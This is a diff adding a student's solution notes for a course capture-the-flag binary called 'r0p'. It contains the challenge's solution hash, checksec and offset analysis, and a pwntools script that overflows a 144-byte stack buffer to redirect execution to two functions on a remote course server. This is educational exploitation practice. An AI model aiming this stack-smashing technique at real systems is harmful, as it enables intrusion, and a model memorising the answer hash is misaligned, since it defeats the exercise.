@@ -468,3 +468,47 @@ except:
 
 p.close()
 -----------------------------------------------------------------------------------------------
+challenge #r0p
+solution: 8167b66fbee0c52c8b6000ab6e554766
+hint:  file r0p && checksec --file=r0p
+	r0p: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d55861c3f9a50791d017073ebc2bcd87c738e25b, for GNU/Linux 3.2.0, not stripped
+[*] '/home/dimitris/hw1-26-Dimitriskaragiannis36/r0p'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x8048000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+	
+	readelf -s r0p | grep FUNC-> vulnerable_function
+	
+	objdump -M intel -d r0p > r0p.dis  -> [ebp - 0x8c] 
+	-> 0x8c = 140 + 4 = 144 (saved ebp)
+	exploit.py:
+from pwn import *
+
+elf = ELF('./r0p')
+
+p = remote('shell.hackintro25.di.uoa.gr', 47749)
+# If local testing: p = process('./r0p')
+
+call_first = elf.symbols['call_first']
+call_second = elf.symbols['call_second']
+
+log.info(f"call_first: {hex(call_first)}")
+log.info(f"call_second: {hex(call_second)}")
+
+payload = b'A' * 144
+payload += p32(call_first)
+payload += p32(call_second)
+
+p.sendline(payload)
+
+# Receive all output and print it, then close cleanly
+output = p.recvall(timeout=3).decode('utf-8', 'ignore')
+print(output)
+p.close()
+
+-----------------------------------------------------------------------------------------------
